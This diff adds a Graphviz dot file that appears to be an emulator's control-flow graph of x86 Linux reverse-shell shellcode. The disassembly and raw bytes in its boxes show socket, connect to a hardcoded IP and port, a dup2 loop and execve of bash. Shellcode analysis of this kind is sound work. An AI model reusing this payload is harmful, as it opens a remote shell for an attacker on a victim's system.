@@ -1,0 +1,26 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x90ff4f8" [shape=box, label = "0x00417000 31C0                            xor eax,eax\l0x00417002 31DB                            xor ebx,ebx\l0x00417004 31C9                            xor ecx,ecx\l0x00417006 31D2                            xor edx,edx\l0x00417008 31F6                            xor esi,esi\l0x0041700a 31FF                            xor edi,edi\l0x0041700c B066                            mov al,0x66\l0x0041700e B301                            mov bl,0x1\l0x00417010 57                              push edi\l0x00417011 53                              push ebx\l0x00417012 6A02                            push byte 0x2\l0x00417014 89E1                            mov ecx,esp\l"]
+	 "0x91020d8" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417016 socket\l"]
+	 "0x91021b0" [shape=box, label = "0x00417018 96                              xchg eax,esi\l0x00417019 B066                            mov al,0x66\l0x0041701b 57                              push edi\l0x0041701c 68C0A838B4                      push dword 0xb438a8c0\l0x00417021 66683A97                        push word 0x973a\l0x00417025 43                              inc ebx\l0x00417026 6653                            push bx\l0x00417028 43                              inc ebx\l0x00417029 89E1                            mov ecx,esp\l0x0041702b 6A10                            push byte 0x10\l0x0041702d 51                              push ecx\l0x0041702e 56                              push esi\l0x0041702f 89E1                            mov ecx,esp\l"]
+	 "0x9102ec0" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417031 connect\l"]
+	 "0x9102fa0" [shape=box, label = "0x00417033 87CB                            xchg ebx,ecx\l0x00417035 87DE                            xchg esi,ebx\l0x00417037 89F8                            mov eax,edi\l"]
+	 "0x91032a0" [shape=box, label = "0x00417039 B03F                            mov al,0x3f\l"]
+	 "0x91033a0" [shape=box, label = "0x0041703b 49                              dec ecx\l"]
+	 "0x91034a0" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041703c dup2\l"]
+	 "0x9103578" [shape=box, label = "0x0041703e 75                              jnz 0x1\l"]
+	 "0x9103678" [shape=box, label = "0x00417040 B00B                            mov al,0xb\l0x00417042 57                              push edi\l0x00417043 6862617368                      push dword 0x68736162\l0x00417048 686E2F2F2F                      push dword 0x2f2f2f6e\l0x0041704d 682F2F6269                      push dword 0x69622f2f\l0x00417052 89E3                            mov ebx,esp\l"]
+	 "0x9103c90" [shape=box, style=filled, color=".7 .3 1.0", label = "0x00417054 execve\l"]
+	 "0x90ff4f8" -> "0x91020d8" [style = bold ]
+	 "0x91020d8" -> "0x91021b0" [style = bold ]
+	 "0x91021b0" -> "0x9102ec0" [style = bold ]
+	 "0x9102ec0" -> "0x9102fa0" [style = bold ]
+	 "0x9102fa0" -> "0x91032a0" [style = bold ]
+	 "0x91032a0" -> "0x91033a0" [style = bold, color=orange ]
+	 "0x91033a0" -> "0x91034a0" [style = bold, color=orange ]
+	 "0x91034a0" -> "0x9103578" [style = bold, color=orange ]
+	 "0x9103578" -> "0x91032a0" [style = bold, color=orange ]
+	 "0x9103578" -> "0x9103678" [style = bold ]
+	 "0x9103678" -> "0x9103c90" [style = bold ]
+}
